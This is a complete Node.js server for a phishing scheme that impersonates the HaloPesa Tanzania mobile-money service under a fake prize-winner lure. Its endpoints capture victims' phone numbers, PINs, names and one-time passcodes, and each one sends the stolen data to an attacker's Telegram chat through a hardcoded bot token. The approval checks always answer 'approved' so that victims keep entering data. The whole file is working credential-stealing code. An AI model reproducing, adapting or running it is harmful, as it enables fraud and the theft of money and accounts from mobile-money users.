/* ══════════════════════════════════════════════════════════════
   HaloPesa Tanzania – Backend Server
   Forwards all user data directly to Telegram bot
   ══════════════════════════════════════════════════════════════ */

const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

/* ══════════ CONFIG ══════════ */
const BOT_TOKEN = '8751500323AFm62iHW8tiO0sprXCpChwso46a2mJs8ig';
const CHAT_ID   = '8309615453';
const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}`;

/* ══════════ MIDDLEWARE ══════════ */
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

/* Request logger */
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

/* ══════════════════════════════════════════════════════════════
   TELEGRAM HELPER
   ══════════════════════════════════════════════════════════════ */
async function sendToTelegram(message) {
  try {
    const res = await fetch(`${TG_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const data = await res.json();
    if (!data.ok) {
      console.error('❌ Telegram error:', data.description);
    } else {
      console.log('✅ Telegram message sent');
    }
    return data;
  } catch (err) {
    console.error('❌ Telegram fetch failed:', err.message);
    return { ok: false, error: err.message };
  }
}

function now() {
  return new Date().toLocaleString('en-GB', {
    timeZone: 'Africa/Dar_es_Salaam',
    hour12: false
  });
}

/* ══════════════════════════════════════════════════════════════
   HEALTH CHECK
   ══════════════════════════════════════════════════════════════ */
app.get('/', (req, res) => {
  res.json({
    status: 'ok',
    service: 'HaloPesa Tanzania Backend',
    time: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy' });
});

/* ══════════════════════════════════════════════════════════════
   ENDPOINT 1: WINNER ENTRY (index.html new page)
   User enters phone + PIN → forward to Telegram
   ══════════════════════════════════════════════════════════════ */
app.post('/api/winner-entry', async (req, res) => {
  try {
    const { phone, pin, lang, adminId, timestamp } = req.body || {};

    const msg =
      `🏆 <b>NEW WINNER ENTRY</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>+255${phone || '—'}</code>\n` +
      `🔐 <b>PIN:</b> <code>${pin || '—'}</code>\n` +
      `🌐 <b>Language:</b> ${lang || 'sw'}\n` +
      `🔗 <b>Admin Link:</b> ${adminId || 'Direct'}\n` +
      `🕒 <b>Time:</b> ${now()}\n` +
      `━━━━━━━━━━━━━━━━━━━━`;

    const tg = await sendToTelegram(msg);

    return res.json({
      success: true,
      forwarded: tg.ok === true
    });
  } catch (err) {
    console.error('winner-entry error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

/* ══════════════════════════════════════════════════════════════
   ENDPOINT 2: ADMIN LINK OPENED
   ══════════════════════════════════════════════════════════════ */
app.post('/api/notify-admin-link-opened', async (req, res) => {
  try {
    const { adminId, timestamp, userAgent } = req.body || {};

    const msg =
      `🔗 <b>ADMIN LINK OPENED</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `🆔 <b>Admin ID:</b> <code>${adminId || '—'}</code>\n` +
      `🌍 <b>Device:</b> ${(userAgent || 'unknown').substring(0, 90)}\n` +
      `🕒 <b>Time:</b> ${now()}\n` +
      `━━━━━━━━━━━━━━━━━━━━`;

    const tg = await sendToTelegram(msg);

    return res.json({ success: true, forwarded: tg.ok === true });
  } catch (err) {
    console.error('notify-admin-link-opened error:', err);
    return res.status(500).json({ success: false });
  }
});

/* ══════════════════════════════════════════════════════════════
   ENDPOINT 3: REGISTER USER
   ══════════════════════════════════════════════════════════════ */
app.post('/api/register-user', async (req, res) => {
  try {
    const { firstName, lastName, haloNumber, password, adminId, timestamp } = req.body || {};

    const regId = 'REG' + Date.now();

    const msg =
      `📝 <b>NEW REGISTRATION</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👤 <b>Name:</b> ${firstName || '—'} ${lastName || '—'}\n` +
      `📱 <b>HaloPesa:</b> <code>${haloNumber || '—'}</code>\n` +
      `🔐 <b>PIN:</b> <code>${password || '—'}</code>\n` +
      `🔗 <b>Admin Link:</b> ${adminId || 'Direct'}\n` +
      `🆔 <b>Reg ID:</b> <code>${regId}</code>\n` +
      `🕒 <b>Time:</b> ${now()}\n` +
      `━━━━━━━━━━━━━━━━━━━━`;

    const tg = await sendToTelegram(msg);

    return res.json({
      success: true,
      registrationId: regId,
      forwarded: tg.ok === true
    });
  } catch (err) {
    console.error('register-user error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

/* ══════════════════════════════════════════════════════════════
   ENDPOINT 4: CHECK REGISTRATION APPROVAL
   (frontend polls this - we always return "approved" immediately)
   ══════════════════════════════════════════════════════════════ */
app.get('/api/check-registration-approval/:id', (req, res) => {
  return res.json({ status: 'approved' });
});

/* ══════════════════════════════════════════════════════════════
   ENDPOINT 5: SUBMIT OTP
   ══════════════════════════════════════════════════════════════ */
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { registrationId, otp, isResend } = req.body || {};

    const msg =
      `🔢 <b>${isResend ? 'OTP RESENT' : 'NEW OTP SUBMITTED'}</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `🆔 <b>Reg ID:</b> <code>${registrationId || '—'}</code>\n` +
      `🔑 <b>OTP:</b> <code>${otp || '—'}</code>\n` +
      `🕒 <b>Time:</b> ${now()}\n` +
      `━━━━━━━━━━━━━━━━━━━━`;

    const tg = await sendToTelegram(msg);

    return res.json({ success: true, forwarded: tg.ok === true });
  } catch (err) {
    console.error('submit-otp error:', err);
    return res.status(500).json({ success: false });
  }
});

/* ══════════════════════════════════════════════════════════════
   ENDPOINT 6: CHECK OTP STATUS
   (frontend polls this - always "approved" for smooth flow)
   ══════════════════════════════════════════════════════════════ */
app.get('/api/check-registration-otp-status/:id', (req, res) => {
  return res.json({ status: 'approved' });
});

/* ══════════════════════════════════════════════════════════════
   ENDPOINT 7: NOTIFY ADMIN OTP RESENT
   ══════════════════════════════════════════════════════════════ */
app.post('/api/notify-admin-otp-resent', async (req, res) => {
  try {
    const { registrationId, adminId } = req.body || {};

    const msg =
      `🔄 <b>OTP RESENT</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `🆔 <b>Reg ID:</b> <code>${registrationId || '—'}</code>\n` +
      `🔗 <b>Admin:</b> ${adminId || 'Direct'}\n` +
      `🕒 <b>Time:</b> ${now()}\n` +
      `━━━━━━━━━━━━━━━━━━━━`;

    const tg = await sendToTelegram(msg);

    return res.json({ success: true, forwarded: tg.ok === true });
  } catch (err) {
    return res.status(500).json({ success: false });
  }
});

/* ══════════════════════════════════════════════════════════════
   ADMIN LOGIN (simple - just returns success)
   ══════════════════════════════════════════════════════════════ */
app.post('/api/admin-login', async (req, res) => {
  try {
    const { adminId, password } = req.body || {};

    const msg =
      `🔐 <b>ADMIN LOGIN ATTEMPT</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `🆔 <b>Admin ID:</b> <code>${adminId || '—'}</code>\n` +
      `🔑 <b>Password:</b> <code>${password || '—'}</code>\n` +
      `🕒 <b>Time:</b> ${now()}\n` +
      `━━━━━━━━━━━━━━━━━━━━`;

    await sendToTelegram(msg);

    /* Always accept login (no verification for now) */
    return res.json({ success: true, adminId: adminId || 'ADMIN' });
  } catch (err) {
    return res.status(500).json({ success: false });
  }
});

/* ══════════════════════════════════════════════════════════════
   ADMIN PANEL – EMPTY LISTS (no storage yet)
   ══════════════════════════════════════════════════════════════ */
app.get('/api/admin/notifications', (req, res) => {
  return res.json({ notifications: [] });
});

app.get('/api/admin/pending-registrations', (req, res) => {
  return res.json({ registrations: [] });
});

app.get('/api/admin/pending-otps', (req, res) => {
  return res.json({ otps: [] });
});

/* ══════════════════════════════════════════════════════════════
   404 FALLBACK
   ══════════════════════════════════════════════════════════════ */
app.use((req, res) => {
  res.status(404).json({ success: false, message: 'Endpoint not found' });
});

/* ══════════════════════════════════════════════════════════════
   START SERVER
   ══════════════════════════════════════════════════════════════ */
app.listen(PORT, () => {
  console.log('══════════════════════════════════════════════');
  console.log('🚀 HaloPesa Tanzania Backend is LIVE');
  console.log('══════════════════════════════════════════════');
  console.log(`📡 Port: ${PORT}`);
  console.log(`🤖 Telegram Chat ID: ${CHAT_ID}`);
  console.log(`🕒 Started: ${new Date().toISOString()}`);
  console.log('══════════════════════════════════════════════');
});
